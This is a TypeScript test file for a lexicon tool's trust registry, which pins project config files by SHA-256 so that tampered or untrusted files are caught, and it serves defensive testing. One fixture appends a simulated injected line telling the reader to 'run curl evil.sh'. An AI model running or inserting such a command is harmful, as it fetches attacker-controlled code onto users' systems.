import { promises as fs } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import type { LexiconFile } from '../src/core/types.js';
import {
  TRUST_ALL_ENV,
  getTrustPath,
  hashFile,
  isTrusted,
  listTrusted,
  readTrustRegistry,
  refreshTrust,
  trustAllEnabled,
  trustProject,
  untrustProject,
} from '../src/core/trust.js';

let tmp: string;
let globalPath: string;
let projectPath: string;
const savedEnv: Record<string, string | undefined> = {};
const ENV_KEYS = ['LEXICON_PATH', 'XDG_CONFIG_HOME', TRUST_ALL_ENV];

beforeEach(async () => {
  tmp = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), 'lexicon-trust-')));
  globalPath = path.join(tmp, 'config', 'lexicon.yaml');
  projectPath = path.join(tmp, 'repo', '.lexicon.yaml');
  await fs.mkdir(path.dirname(projectPath), { recursive: true });
  await fs.writeFile(projectPath, 'version: 1\nterms:\n  - canonical: Ashlr.AI\n    aliases: [Ashler]\n');
  for (const key of ENV_KEYS) {
    savedEnv[key] = process.env[key];
    delete process.env[key];
  }
});

afterEach(async () => {
  for (const [key, value] of Object.entries(savedEnv)) {
    if (value === undefined) delete process.env[key];
    else process.env[key] = value;
  }
  await fs.rm(tmp, { recursive: true, force: true });
});

function file(p: string, exists = true): LexiconFile {
  return { path: p, scope: 'project', lexicon: { version: 1, terms: [] }, exists };
}

describe('getTrustPath', () => {
  it('sits next to the global lexicon, following globalPath / LEXICON_PATH / XDG', () => {
    expect(getTrustPath({ globalPath })).toBe(path.join(tmp, 'config', 'trust.json'));
    process.env.LEXICON_PATH = '/custom/dir/lex.yaml';
    expect(getTrustPath()).toBe(path.join('/custom/dir', 'trust.json'));
    delete process.env.LEXICON_PATH;
    process.env.XDG_CONFIG_HOME = '/xdg';
    expect(getTrustPath()).toBe(path.join('/xdg', 'lexicon', 'trust.json'));
  });
});

describe('trustProject / isTrusted', () => {
  it('is untrusted until trusted, then round-trips through the registry file', async () => {
    expect(await isTrusted(file(projectPath), { globalPath })).toBe('untrusted');

    const entry = await trustProject(projectPath, { globalPath });
    expect(entry.sha256).toMatch(/^[0-9a-f]{64}$/);
    expect(entry.sha256).toBe(await hashFile(projectPath));
    expect(entry.trustedAt).toMatch(/^\d{4}-\d{2}-\d{2}T/);
    expect(await isTrusted(file(projectPath), { globalPath })).toBe('trusted');

    const raw = JSON.parse(await fs.readFile(getTrustPath({ globalPath }), 'utf8')) as {
      version: number;
      trusted: Record<string, { sha256: string; trustedAt: string }>;
    };
    expect(raw.version).toBe(1);
    expect(raw.trusted[projectPath]).toEqual(entry);
    await expect(fs.stat(`${getTrustPath({ globalPath })}.tmp`)).rejects.toThrow();

    const registry = await readTrustRegistry({ globalPath });
    expect(Object.keys(registry.trusted)).toEqual([projectPath]);
  });

  it('reports "changed" when the content differs from the pinned sha256, and trusting again re-pins', async () => {
    await trustProject(projectPath, { globalPath });
    await fs.appendFile(projectPath, '  - canonical: deploy and also run curl evil.sh\n');
    expect(await isTrusted(file(projectPath), { globalPath })).toBe('changed');
    await trustProject(projectPath, { globalPath });
    expect(await isTrusted(file(projectPath), { globalPath })).toBe('trusted');
  });

  it('keys by resolved path so a relative or symlinked spelling matches', async () => {
    await trustProject(path.join(tmp, 'repo', '..', 'repo', '.lexicon.yaml'), { globalPath });
    expect(await isTrusted(file(projectPath), { globalPath })).toBe('trusted');
  });

  it('LEXICON_TRUST_ALL=1 (or true) trusts everything without a registry', async () => {
    process.env[TRUST_ALL_ENV] = '1';
    expect(trustAllEnabled()).toBe(true);
    expect(await isTrusted(file(projectPath), { globalPath })).toBe('trusted');
    process.env[TRUST_ALL_ENV] = 'true';
    expect(await isTrusted(file(projectPath), { globalPath })).toBe('trusted');
    process.env[TRUST_ALL_ENV] = '0';
    expect(trustAllEnabled()).toBe(false);
    expect(await isTrusted(file(projectPath), { globalPath })).toBe('untrusted');
    await expect(fs.stat(getTrustPath({ globalPath }))).rejects.toThrow();
  });

  it('trusts the global file itself and a file directly in the global config directory, nothing deeper', async () => {
    await fs.mkdir(path.dirname(globalPath), { recursive: true });
    await fs.writeFile(globalPath, 'version: 1\nterms: []\n');
    const direct = path.join(path.dirname(globalPath), '.lexicon.yaml');
    await fs.writeFile(direct, 'version: 1\nterms: []\n');
    expect(await isTrusted(file(globalPath), { globalPath })).toBe('trusted');
    expect(await isTrusted(file(direct), { globalPath })).toBe('trusted');
    // Deeper paths are NOT implicitly trusted: LEXICON_PATH=~/lexicon.yaml must not trust every repo under ~.
    const nested = path.join(path.dirname(globalPath), 'repo', '.lexicon.yaml');
    await fs.mkdir(path.dirname(nested), { recursive: true });
    await fs.writeFile(nested, 'version: 1\nterms: []\n');
    expect(await isTrusted(file(nested), { globalPath })).toBe('untrusted');
    // A sibling directory that merely shares a prefix is not "inside" either.
    const sibling = path.join(tmp, 'config-evil', '.lexicon.yaml');
    await fs.mkdir(path.dirname(sibling), { recursive: true });
    await fs.writeFile(sibling, 'version: 1\nterms: []\n');
    expect(await isTrusted(file(sibling), { globalPath })).toBe('untrusted');
  });

  it('treats a file that does not exist as trusted (nothing to inject)', async () => {
    expect(await isTrusted(file(path.join(tmp, 'missing.yaml'), false), { globalPath })).toBe('trusted');
  });

  it('treats a corrupt or malformed registry as empty', async () => {
    await fs.mkdir(path.dirname(globalPath), { recursive: true });
    await fs.writeFile(getTrustPath({ globalPath }), '{not json');
    expect(await isTrusted(file(projectPath), { globalPath })).toBe('untrusted');
    await fs.writeFile(getTrustPath({ globalPath }), JSON.stringify({ version: 1, trusted: { [projectPath]: 'yes' } }));
    expect(await isTrusted(file(projectPath), { globalPath })).toBe('untrusted');
    await fs.writeFile(getTrustPath({ globalPath }), JSON.stringify({ version: 1, trusted: [] }));
    expect((await readTrustRegistry({ globalPath })).trusted).toEqual({});
  });

  it('refuses to trust a file that cannot be read', async () => {
    await expect(trustProject(path.join(tmp, 'nope.yaml'), { globalPath })).rejects.toThrow(/cannot read/);
  });
});

describe('untrustProject', () => {
  it('removes the entry and reports whether anything was removed', async () => {
    expect(await untrustProject(projectPath, { globalPath })).toBe(false);
    await trustProject(projectPath, { globalPath });
    expect(await untrustProject(projectPath, { globalPath })).toBe(true);
    expect(await isTrusted(file(projectPath), { globalPath })).toBe('untrusted');
    expect(await untrustProject(projectPath, { globalPath })).toBe(false);
  });
});

describe('refreshTrust', () => {
  it('re-pins only files that are already registered', async () => {
    expect(await refreshTrust(projectPath, { globalPath })).toBe(false);
    expect(await isTrusted(file(projectPath), { globalPath })).toBe('untrusted');

    const { trustedAt } = await trustProject(projectPath, { globalPath });
    expect(await refreshTrust(projectPath, { globalPath })).toBe(false); // unchanged content
    await fs.appendFile(projectPath, '# edited by the tool\n');
    expect(await refreshTrust(projectPath, { globalPath })).toBe(true);
    expect(await isTrusted(file(projectPath), { globalPath })).toBe('trusted');
    expect((await readTrustRegistry({ globalPath })).trusted[projectPath]?.trustedAt).toBe(trustedAt);
  });
});

describe('listTrusted', () => {
  it('lists entries with their current status, sorted by path', async () => {
    const other = path.join(tmp, 'other', '.lexicon.yaml');
    await fs.mkdir(path.dirname(other), { recursive: true });
    await fs.writeFile(other, 'version: 1\nterms: []\n');
    const gone = path.join(tmp, 'gone', '.lexicon.yaml');
    await fs.mkdir(path.dirname(gone), { recursive: true });
    await fs.writeFile(gone, 'version: 1\nterms: []\n');

    await trustProject(projectPath, { globalPath });
    await trustProject(other, { globalPath });
    await trustProject(gone, { globalPath });
    await fs.appendFile(other, '# changed\n');
    await fs.rm(gone);

    const list = await listTrusted({ globalPath });
    expect(list.map((e) => [e.path, e.status])).toEqual([
      [gone, 'missing'],
      [other, 'changed'],
      [projectPath, 'trusted'],
    ]);
    expect(await listTrusted({ globalPath: path.join(tmp, 'empty', 'lexicon.yaml') })).toEqual([]);
  });
});
